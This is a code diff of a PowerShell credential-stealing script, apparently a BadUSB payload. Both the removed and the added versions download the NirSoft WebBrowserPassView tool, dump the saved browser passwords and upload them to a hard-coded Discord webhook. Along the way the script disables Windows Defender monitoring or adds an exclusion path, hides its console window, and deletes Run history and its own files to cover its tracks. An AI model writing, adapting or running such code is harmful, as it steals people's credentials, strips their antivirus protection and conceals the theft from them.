@@ -1,45 +1,77 @@
-$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
-$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$dir = "$env:temp\JHknfuiD"
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-Function HideConsole{
-    If ($HideWindow -gt 0){
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-        if($hwnd -ne [System.IntPtr]::Zero){
-            $Type::ShowWindowAsync($hwnd, 0)
-        }
-        else{
-            $Host.UI.RawUI.WindowTitle = 'hideme'
-            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-            $hwnd = $Proc.MainWindowHandle
-            $Type::ShowWindowAsync($hwnd, 0)
-        }
-    }
-}
-HideConsole
-if (!(Test-Path -Path "$dir")) {
-New-Item -ItemType Directory -Path "$dir"
-}
-if (-not $version) {
-  $version = "2.4.6"
-}
-$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$verm = "v$version"
-$zelda = "https://raw.githubusercontent.com/bindas88/bd/main/bin/WebBrowserPassView.exe" 
-if ($Admin -eq 'True') {
-  Set-MpPreference -DisableRealtimeMonitoring $true
+Set-Location C:\Users\Public\Documents
 
-  Add-MpPreference -ExclusionPath "$dir"
+Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
+
+Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
+
+.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
+
+Start-Sleep -Seconds 10
+
+RI WebBrowserPassView.exe
+
+# Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents'
+
+############################################################################################################################################################
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+$dc = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
 }
-$hide = Get-Item "$dir" -Force
-$hide.attributes='Hidden'
-Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\WebBrowserPassView.exe"
-& "$dir\WebBrowserPassView.exe" /stext > "$log"
-curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
-Start-Sleep -Seconds 20
-$unhide = Get-Item "$dir" -Force
-$unhide.attributes='Normal'
-Remove-Item -Path "$dir" -Recurse -Force
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+# empty temp folder
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+# Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+# Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+############################################################################################################################################################
+
+RI $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+# empty temp folder
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+Set-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableRegistryTools -Value 0 -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Run history removed`"}"}}
+
+
+# Delete powershell history
+# Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Powershell history removed`"}"}}
